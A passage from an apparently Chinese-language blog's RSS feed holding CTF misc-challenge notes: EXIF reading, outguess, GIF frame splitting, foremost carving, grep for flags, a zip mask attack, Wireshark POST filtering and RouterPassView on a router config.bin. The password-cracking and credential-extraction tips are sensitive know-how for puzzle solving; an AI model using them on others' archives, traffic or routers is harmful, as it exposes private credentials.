        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;exif_dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'XP Comment'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exif_dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exif_dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'XP Comment'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;outguess&quot;&gt;outguess&lt;/h2&gt;
&lt;p&gt;攻防世界misc-avatar
outguess -r lamb.jpg -out 获得flag&lt;/p&gt;

&lt;h2 id=&quot;图片分离拼接&quot;&gt;图片分离拼接&lt;/h2&gt;
&lt;p&gt;xctf glance-50
工具：imagemagick
分离：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ffmpeg &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; glance.gif frames/frame_%05d.png
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;拼接：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;montage frames/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.png &lt;span class=&quot;nt&quot;&gt;-geometry&lt;/span&gt; +0+0 &lt;span class=&quot;nt&quot;&gt;-tile&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; frames | &lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;x1 flag.png 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;压缩包&quot;&gt;压缩包&lt;/h2&gt;

&lt;h2 id=&quot;foremost分离图片&quot;&gt;Foremost分离图片&lt;/h2&gt;
&lt;p&gt;题目文件：foremost.jpg&lt;br /&gt;
使用binwalk进行分析，发现图片中隐藏了另一个图片
&lt;img src=&quot;/assets/img/posts/foremost-1.png&quot; alt=&quot;avatar&quot; /&gt; &lt;br /&gt;
使用foremost命令进行分离&lt;br /&gt;
&lt;img src=&quot;/assets/img/posts/foremost-2.png&quot; alt=&quot;avatar&quot; /&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/posts/foremost-3.png&quot; alt=&quot;avatar&quot; /&gt;&lt;br /&gt;
成功分离出包含flag的图片&lt;br /&gt;
&lt;img src=&quot;/assets/img/posts/foremost-4.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;grep-flag--r&quot;&gt;grep “flag” -r&lt;/h2&gt;

&lt;p&gt;题目文件：zip
根据题目文件名字猜测，通过增加后缀变成压缩包来解压。&lt;br /&gt;
解压后发现有很多文件，使用查找文件内容命令查找flag&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;flag&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; /Users/co0ontty/Downloads/眼见非实/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;发现flag在/word/document.xml文件中&lt;br /&gt;
&lt;img src=&quot;/assets/img/posts/grepflag.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;掩码攻击&quot;&gt;掩码攻击&lt;/h2&gt;
&lt;p&gt;适用于知道部分密码进行压缩包破解
&lt;a href=&quot;https://i.loli.net/2019/04/16/5cb5c6883e32e.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/16/5cb5c6883e32e.png&quot; alt=&quot;屏幕快照 2019-04-16 20.11.29.png&quot; /&gt;&lt;/a&gt;
红线部分为密码格式，前6位为meimei后四位随机&lt;/p&gt;

&lt;h2 id=&quot;流量分析类&quot;&gt;流量分析类&lt;/h2&gt;

&lt;h2 id=&quot;wireshark&quot;&gt;wireshark&lt;/h2&gt;

&lt;p&gt;需要分析登录信息，使用条件”http.request.method==POST”进行过滤得到答案&lt;/p&gt;

&lt;h2 id=&quot;其他&quot;&gt;其他&lt;/h2&gt;
&lt;h2 id=&quot;路由器配置文件-configbin&quot;&gt;路由器配置文件 config.bin&lt;/h2&gt;

&lt;p&gt;题目文件：config.bin
使用RouterPassView查看config.bin得到答案&lt;/p&gt;
</description>
        <pubDate>Sat, 06 Apr 2019 00:18:43 +0800</pubDate>
        <link>http://localhost:4000/2019/04/06/miscnote.html</link>
        <guid isPermaLink="true">http://localhost:4000/2019/04/06/miscnote.html</guid>
        
        <category>CTF</category>
        
        <category>ALL</category>
        
        
        <category>CTF</category>
        
        <category>ALL</category>
        
      </item>
    
  </channel>
</rss>
